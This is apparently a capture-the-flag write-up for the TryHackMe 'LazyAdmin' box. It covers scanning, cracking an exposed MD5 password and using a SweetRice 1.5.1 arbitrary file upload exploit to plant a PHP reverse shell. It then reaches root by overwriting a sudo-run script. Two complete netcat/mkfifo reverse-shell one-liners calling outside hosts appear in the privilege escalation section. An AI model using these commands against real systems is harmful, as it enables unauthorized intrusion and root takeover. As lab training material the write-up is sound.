# LazyAdmin

**IP:** 10.10.109.207  
**Platform:** THM  
**Difficulty:** Easy  
**OS:** Linux  
**Date:** 06/06/2025

## Reconnaissance

```bash
nmap -sC -sV -T4 10.10.109.207 -oA nmap/LazyAdmin
```

| Port | Service | Version |
|------|---------|---------|
| 22 | ssh | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
| 80 | http | Apache httpd 2.4.18 |

## Enumeration

Found a backup of the sql database at `inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql`.
```bash
wget -q http://10.10.109.207/content/inc/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql;ls

mysql_bakup_20191129023059-1.5.1.sql
```

## Exploitation

Found username `manager` and an md5 password `42f749ade7f9e195bf475f37a44cafcb` in the `.sql` file and cracked it with CrackStation to reveal the password `Password123`.
```bash
grep "passwd" mysql_bakup_20191129023059-1.5.1.sql | sed 's/;[ ]*/;\n/g'

...
s:5:\\"admin\\";
s:7:\\"manager\\";
s:6:\\"passwd\\";
s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";
s:5:\\"close\\";
i:1;
s:9:\\"close_tip\\";
...
```
![[Pasted image 20250606212408.png]]
The dashboard revealed the version is `1.5.1`, I searched it on `searchsploit` and found an Arbitrary File Upload vulnerability `40716`.
```
searchsploit sweetrice 1.5.1
...                                                                         | php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File Upload                                        ...
searchsploit -m 40716 
```

Used the exploit to upload a php reverse shell as `www-data`.
```bash
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
|  _________                      __ __________.__                  |
| /   _____/_  _  __ ____   _____/  |\______   \__| ____  ____      |
| \_____  \ \/ \/ // __ \_/ __ \   __\       _/  |/ ___\/ __ \     |
| /        \     /\  ___/\  ___/|  | |    |   \  \  \__\  ___/     |
|/_______  / \/\_/  \___  >\___  >__| |____|_  /__|\___  >___  >    |
|        \/             \/     \/            \/        \/    \/     |
|    > SweetRice 1.5.1 Unrestricted File Upload                     |
|    > Script Cod3r : Ehsan Hosseini                                |
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+

Enter The Target URL(Example : localhost.com) : 10.10.109.207/content
Enter Username : manager
Enter Password : Password123
Enter FileName (Example:.htaccess,shell.php5,index.html) : shell.php5
[+] Sending User&Pass...
[+] Login Succssfully...
[+] File Uploaded...
[+] URL : http://10.10.109.207/content/attachment/shell.php5
                       
rlwrap nc -lvnp 9001

listening on [any] 9001 ...
connect to [10.23.121.106] from (UNKNOWN) [10.10.109.207] 46742
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 23:32:24 up  1:21,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
...
```

User flag was in `/home/itguy/user.txt`.
```bash
cat /home/itguy/user.txt
```

## Privilege Escalation

`www-data` could run a Perl script `/home/itguy/backup.pl` as sudo with NOPASSWD. This script just ran another script, `/etc/copy.sh`, which was conveniently already a reverse shell. 
```bash
sudo -l
...
User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl

cat /home/itguy/backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");

cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

I wrote over that with my own reverse shell and ran it as sudo to get a shell as `root`.
```
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.23.121.106 9002 >/tmp/f' > /etc/copy.sh  

sudo /usr/bin/perl /home/itguy/backup.pl

id
uid=0(root) gid=0(root) groups=0(root)
```

root flag was in `/root/root.txt`.
```bash
cat /root/root.txt
```

---
#nmap #searchsploit #fileupload #sweetrice #reverseshell #sudo-privesc #md5crack #http-enum #linux-privesc #thm